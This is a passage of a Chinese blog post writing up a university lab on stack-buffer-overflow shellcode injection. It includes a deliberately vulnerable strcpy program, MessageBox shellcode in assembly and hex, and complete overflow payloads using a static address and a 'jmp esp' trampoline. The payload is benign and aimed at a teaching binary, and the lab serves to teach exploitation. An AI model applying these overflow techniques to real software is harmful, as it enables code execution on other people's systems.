@@ -1,0 +1,606 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>shellcode注入 | reus</title><meta name="keywords" content="shellcode注入"><meta name="author" content="reus09"><meta name="copyright" content="reus09"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="软件安全第三次实验[TOC] 0x01 实验目的 了解shellcode注入原理 理解给出的弹出对话框的汇编代码 通过淹没静态地址来实现shellcode的代码植入 通过跳板来实现shellcode的代码植入 尝试修改汇编语句的shellcode实现修改标题等简单操作  0x02 程序理解2.1 shellcode注入原理 淹没返回地址 我们通过字符串赋值修改缓冲区内容，将返回地址修改为我们输入的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode注入">
+<meta property="og:url" content="https://reus09.github.io/2022/01/01/shellcode%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="reus">
+<meta property="og:description" content="软件安全第三次实验[TOC] 0x01 实验目的 了解shellcode注入原理 理解给出的弹出对话框的汇编代码 通过淹没静态地址来实现shellcode的代码植入 通过跳板来实现shellcode的代码植入 尝试修改汇编语句的shellcode实现修改标题等简单操作  0x02 程序理解2.1 shellcode注入原理 淹没返回地址 我们通过字符串赋值修改缓冲区内容，将返回地址修改为我们输入的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.3gbizhi.com/2021/0923/20210923091817189.jpg">
+<meta property="article:published_time" content="2022-01-01T13:19:48.000Z">
+<meta property="article:modified_time" content="2022-01-01T13:27:20.642Z">
+<meta property="article:author" content="reus09">
+<meta property="article:tag" content="shellcode注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.3gbizhi.com/2021/0923/20210923091817189.jpg"><link rel="shortcut icon" href="https://w.wallhaven.cc/full/1k/wallhaven-1k2p8v.jpg"><link rel="canonical" href="https://reus09.github.io/2022/01/01/shellcode%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'shellcode注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2022-01-01 21:27:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><script src="/live2d-widget/autoload.js"></script><style type="text/css">#toggle-sidebar {bottom: 80px}</style><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="reus" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gitee.com/reus09/typora/raw/master/img/20211103151005.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.3gbizhi.com/2021/0923/20210923091817189.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">reus</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">shellcode注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-01T13:19:48.000Z" title="发表于 2022-01-01 21:19:48">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-01T13:27:20.642Z" title="更新于 2022-01-01 21:27:20">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/">软件安全实验</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="shellcode注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="软件安全第三次实验"><a href="#软件安全第三次实验" class="headerlink" title="软件安全第三次实验"></a>软件安全第三次实验</h1><p>[TOC]</p>
+<h2 id="0x01-实验目的"><a href="#0x01-实验目的" class="headerlink" title="0x01 实验目的"></a>0x01 实验目的</h2><ul>
+<li>了解<code>shellcode</code>注入原理</li>
+<li>理解给出的弹出对话框的汇编代码</li>
+<li>通过淹没静态地址来实现<code>shellcode</code>的代码植入</li>
+<li>通过跳板来实现<code>shellcode</code>的代码植入</li>
+<li>尝试修改汇编语句的<code>shellcode</code>实现修改标题等简单操作</li>
+</ul>
+<h2 id="0x02-程序理解"><a href="#0x02-程序理解" class="headerlink" title="0x02 程序理解"></a>0x02 程序理解</h2><h3 id="2-1-shellcode注入原理"><a href="#2-1-shellcode注入原理" class="headerlink" title="2.1 shellcode注入原理"></a>2.1 shellcode注入原理</h3><ul>
+<li>淹没返回地址<ul>
+<li>我们通过字符串赋值修改缓冲区内容，将返回地址修改为我们输入的shellcode首地址</li>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115190428.png" alt="image-20211115190421632"></li>
+<li>这种会存在问题，如果程序被装入运行的时候，栈帧发生移位，先前查出的返回地址此时指向无效指令，静态的shellcode地址不能适应动态的内存变化，这里我们可以根据填充多个<code>0x90</code>的方式来大量填充。</li>
+</ul>
+</li>
+<li>利用跳板实现shellcode注入<ul>
+<li>ESP寄存器中的数据总是指向系统栈中，且不会被溢出的数据破坏，函数返回时，ESP指向的位置恰好是我们所淹没的返回地址的下一个位置。</li>
+<li>如图<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115191037.png" alt="image-20211115191037401"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-2-程序理解"><a href="#2-2-程序理解" class="headerlink" title="2.2 程序理解"></a>2.2 程序理解</h3><h4 id="2-2-1-弹出shellcode的汇编理解"><a href="#2-2-1-弹出shellcode的汇编理解" class="headerlink" title="2.2.1 弹出shellcode的汇编理解"></a>2.2.1 弹出shellcode的汇编理解</h4><ul>
+<li><p>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	<span class="keyword">char</span> dllbuf[<span class="number">11</span>] = <span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">	_asm&#123;</span><br><span class="line">		sub sp,<span class="number">0x440</span></span><br><span class="line">		<span class="keyword">xor</span> ebx,ebx</span><br><span class="line">		push ebx</span><br><span class="line">		push <span class="number">0x74707562</span>		<span class="comment">//bupt</span></span><br><span class="line">		push <span class="number">0x74707562</span>		<span class="comment">//bupt</span></span><br><span class="line"></span><br><span class="line">		mov eax,esp</span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push eax</span><br><span class="line">		push ebx</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0x77E23D68</span>	<span class="comment">//messageboxA  入口地址</span></span><br><span class="line">		call eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,<span class="number">0x77E7B0BB</span>	<span class="comment">//exitprocess  入口地址</span></span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>程序功能：</p>
+<ul>
+<li>弹出一个<code>buptbupt</code>的框<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115191821.png" alt="image-20211115191821447"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>使用<code>Depend.exe</code>对程序<code>overflow.exe</code>进行分析</p>
+<ul>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115192019.png" alt="image-20211115192019342"></p>
+</li>
+<li><p>点击<code>kernel32.dll</code>，在右侧窗口找到<code>exitprocess</code>的函数入口点为<code>0x0001B0BB</code>，在下方窗口找到<code>kernel32.dll</code>的实际基址为<code>0x77E60000</code>，两个地址相加可得<code>exitprocess</code>的入口地址：<code>0x77E8B0B0</code></p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115192150.png" alt="image-20211115192150333"></li>
+</ul>
+</li>
+<li><p>在<code>user32.dll</code>，在右侧窗口找到<code>MessageBoxA</code>的函数入口点为<code>0x00033D68</code>，在下方窗口找到user32.dll的实际基址为<code>0x77DF0000</code>，两个地址相加可得<code>MessageBoxA</code>的入口地址：<code>0x77E23D68</code></p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115192301.png" alt="image-20211115192301524"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>因此该<code>shellcode</code>执行的命令便不难理解，首先压入<code>0x74707562    </code>(即bupt)作为函数<code>MessageboxA</code>的参数压入栈中，然后执行<code>MessageboxA</code>函数，最后调用函数<code>Exitprocess</code>结束进程。</p>
+</li>
+</ul>
+<h4 id="2-2-2-overflow-exe分析"><a href="#2-2-2-overflow-exe分析" class="headerlink" title="2.2.2 overflow_exe分析"></a>2.2.2 overflow_exe分析</h4><ul>
+<li><p>阅读并理解代码</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> authenticated;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">44</span>];</span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!	</span></span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	FILE * fp;</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);<span class="comment">//prepare for messagebox</span></span><br><span class="line">	<span class="keyword">if</span>(!(fp=<span class="built_in">fopen</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">	valid_flag = <span class="built_in">verify_password</span>(password);</span><br><span class="line">	<span class="keyword">if</span>(valid_flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>头文件中包含<code>windows.h</code>，方便调用<code>LoadLibrary()</code>函数去装载<code>user32.dll</code>，以便在植入的代码中调用<code>MseeageBox</code></p>
+</li>
+<li><p>在主函数打开程序同目录下的<code>password.txt</code>文件并读取文件内容即密码，若无法打开，则直接退出程序</p>
+</li>
+<li><p>跳转到子函数<code>verify_password()</code>判断输入的密码是否正确即判断输入的密码<code>password</code>与正确的密码<code>1234567</code>是否相等,如果相等则子函数返回<code>0</code>，否则返回非<code>0</code>，在函数返回之前将输入的<code>password</code>拷贝到数组<code>buffer[44]</code>里面</p>
+</li>
+<li><p>主函数在判断子函数<code>verify_password()</code>返回值：如果是<code>0</code>，则输出<code>Congratulation! You have passed the</code><br><code>verification!</code>，关闭<code>password.txt</code>文件，结束程序，否则输出<code>incorrect password!</code>，关闭<code>password.txt</code>文件，结束程序.</p>
+</li>
+</ul>
+<h2 id="0x03-实验内容"><a href="#0x03-实验内容" class="headerlink" title="0x03 实验内容"></a>0x03 实验内容</h2><h3 id="3-1-淹没静态地址实现shellcode植入"><a href="#3-1-淹没静态地址实现shellcode植入" class="headerlink" title="3.1 淹没静态地址实现shellcode植入"></a>3.1 淹没静态地址实现shellcode植入</h3><ul>
+<li><p>分析栈中结构</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115192826.png" alt="1565845495853"></li>
+<li>我们这里需要做的是覆盖栈中的参数空间，然后将返回地址修改为<code>buffer</code>首地址(即我们输入的<code>shellcode</code>首地址)</li>
+</ul>
+</li>
+<li><p>构造shellcode,这里我们借用工具直接将我们之前分析好的汇编语言转化为机器码</p>
+<ul>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115193343.png" alt="image-20211115193343687"></p>
+</li>
+<li><p>转化成的机器码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">66 81 EC 40 04 33 DB 53 68 62 75 70 74 68 62 75 70 74 8B C4 53 50 50 53 B8 68 3D E2 77 8B C0 8B C0 FF D0 53 B8 BB B0 E7 77 8B C0 8B C0 FF D0</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>找到buffer首地址</p>
+<ul>
+<li>我们用<code>ollydbg</code>打开程序<code>overflow_exe.exe</code></li>
+<li>在<code>strcpy</code>函数处设置断点，程序运行到此时缓冲区的<code>dest</code>指向的地址即为我们要注入的<code>shellcode</code>首地址<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115194244.png" alt="image-20211115194244587"></li>
+<li>可以看到我们<code>dest</code>指向的地址为<code>0x12FAF0</code></li>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115194339.png" alt="image-20211115194339810"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>通过IDA_pro我们发现我们需要填充多少字节</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115200753.png" alt="image-20211115194530326"></li>
+</ul>
+</li>
+<li><p>因此我们需要填充<code>0x34</code>个字节才能够达到返回地址</p>
+</li>
+<li><p>因此我们的<code>shellcode</code>应该为：</p>
+<ul>
+<li><p><code>Shellcode</code> + <code>0x90</code> * (<code>0x34 - len(Shellcode)</code>) + <code>0X12FAF0</code></p>
+</li>
+<li><p>我们在<code>010editor</code>里面编写我们的完整<code>shellcode</code></p>
+</li>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115194902.png" alt="image-20211115194902099"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">33</span> DB <span class="number">53</span> <span class="number">68</span> <span class="number">62</span> <span class="number">75</span> <span class="number">70</span> <span class="number">74</span> <span class="number">68</span> <span class="number">62</span> <span class="number">75</span> <span class="number">70</span> <span class="number">74</span> <span class="number">8B</span> C4 <span class="number">53</span></span><br><span class="line"><span class="number">50</span> <span class="number">50</span> <span class="number">53</span> B8 <span class="number">68</span> <span class="number">3</span>D E2 <span class="number">77</span> FF D0 <span class="number">53</span> B8 BB B0 E7 <span class="number">77</span></span><br><span class="line">FF D0 <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> F0 FA <span class="number">12</span> <span class="number">00</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>将上述文件重名为<code>password.txt</code>存储到程序的同一目录下</p>
+</li>
+<li><p>执行程序<code>overflow_exe.exe</code></p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115195720.png" alt="image-20211115195720549"></li>
+<li>看到我们成功弹框拿到<code>shell</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="3-2-跳板实现shellcode的代码植入"><a href="#3-2-跳板实现shellcode的代码植入" class="headerlink" title="3.2 跳板实现shellcode的代码植入"></a>3.2 跳板实现shellcode的代码植入</h3><ul>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115191037.png" alt="image-20211115191037401"></p>
+</li>
+<li><p>我们只需要找到合适的<code>jmp esp</code>指令即可</p>
+</li>
+<li><p>使用<code>ollydbg</code>打开<code>overflow.exe</code>文件</p>
+</li>
+<li><p>在<code>strcpy</code>函数上设置断点，运行至断点。然后右键选择<code>overflow return address -&gt;ASCII overflow returns -&gt;search JMP/CALL ESP</code>，搜索<code>JMP/CALL ESP</code>语句，并点击日志查看,选择一条在<code>user32</code>中的<code>JMP ESP</code>指令，记录地址<code>0x77E2E32A</code></p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115200636.png" alt="image-20211115200636163"></li>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211112204537.png" alt="image-20211112204537386"></li>
+</ul>
+</li>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/20211115200758.png" alt="image-20211115200758484"></p>
+</li>
+<li><p>编写总的shellcode,根据地址空间，我们需要填充<code>0x34</code>个字节，然后加入我们的<code>jmp esp</code> ，再加上我们<code>shellcode</code>和若干<code>0x90</code></p>
+<ul>
+<li><p>我们的<code>shellcode</code>如下：<code>0x34</code>个<code>0x90</code> + <code>0x77E2E32A</code> + <code>Shellcode</code> + 若干<code>0x90</code></p>
+</li>
+<li><p>我们在<code>010editor</code>下编写：</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115201130.png" alt="image-20211115201130520"></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">2</span>A E3 E2 <span class="number">77</span> <span class="number">33</span> DB <span class="number">53</span> <span class="number">68</span> <span class="number">62</span> <span class="number">75</span> <span class="number">70</span> <span class="number">74</span></span><br><span class="line"><span class="number">68</span> <span class="number">62</span> <span class="number">75</span> <span class="number">70</span> <span class="number">74</span> <span class="number">8B</span> C4 <span class="number">53</span> <span class="number">50</span> <span class="number">50</span> <span class="number">53</span> B8 <span class="number">68</span> <span class="number">3</span>D E2 <span class="number">77</span></span><br><span class="line">FF D0 <span class="number">53</span> B8 BB B0 E7 <span class="number">77</span> FF D0 <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>将其放到程序目录下运行，对话框弹出</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/20211115201313.png" alt="image-20211115201313026"></li>
+</ul>
+</li>
+</ul>
+<h3 id="3-3-修改汇编语句来实现修改标题"><a href="#3-3-修改汇编语句来实现修改标题" class="headerlink" title="3.3 修改汇编语句来实现修改标题"></a>3.3 修改汇编语句来实现修改标题</h3><ul>
+<li><p>标题修改为软件安全</p>
+</li>
+<li><p>首先查看<code>MessageboxA</code>的结构</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">MessageBoxA PROTO,</span><br><span class="line">    hWnd:DWORD,                   ;窗口句柄（可以为空）</span><br><span class="line">    lpText:PTR BYTE,                 ;字符串，对话框内</span><br><span class="line">    lpCaption:PTR BYTE,           ;字符串，对话框标题</span><br><span class="line">    uType:DWORD                   ;内容和行为</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>基于控制台的应用程序可以将 hWnd 设置为空，表示该消息框没有相关的包含窗口或父窗口。lpText 参数是指向空字节结束字符串的指针，该字符串将出现在消息框内。lpCaption 参数指向作为对话框标题的空字节结束字符串。uType 参数指定对话框的内容和行为。</li>
+</ul>
+</li>
+<li><p>根据函数调用的参数中入栈的顺序为从右向左，所以先向栈中压入标题<code>软件安全</code>，然后压入<code>0x00</code>截断，最后压入文本内容<code>buptbupt</code></p>
+<ul>
+<li><p>因此完整程序为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub sp,<span class="number">0x440</span></span><br><span class="line"><span class="keyword">xor</span> ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line"></span><br><span class="line">push <span class="number">0xABC8B2B0</span>		<span class="comment">//安全</span></span><br><span class="line">push <span class="number">0XFEBCEDC8</span>		<span class="comment">//软件</span></span><br><span class="line">push <span class="number">0x00000000</span>		<span class="comment">//阻断</span></span><br><span class="line">push <span class="number">0x74707562</span>		<span class="comment">//bupt</span></span><br><span class="line">push <span class="number">0x74707562</span>		<span class="comment">//bupt</span></span><br><span class="line"></span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx <span class="comment">//MB_OK</span></span><br><span class="line">add eax, <span class="number">12</span></span><br><span class="line">push eax <span class="comment">//title</span></span><br><span class="line">sub eax, <span class="number">12</span></span><br><span class="line">push eax <span class="comment">//text</span></span><br><span class="line">push ebx <span class="comment">//NULL</span></span><br><span class="line"></span><br><span class="line">mov eax,<span class="number">0x77E23D68</span>	<span class="comment">//messageboxA  入口地址</span></span><br><span class="line">call eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,<span class="number">0x77E7B0BB</span>	<span class="comment">//exitprocess  入口地址</span></span><br><span class="line">call eax</span><br></pre></td></tr></table></figure></li>
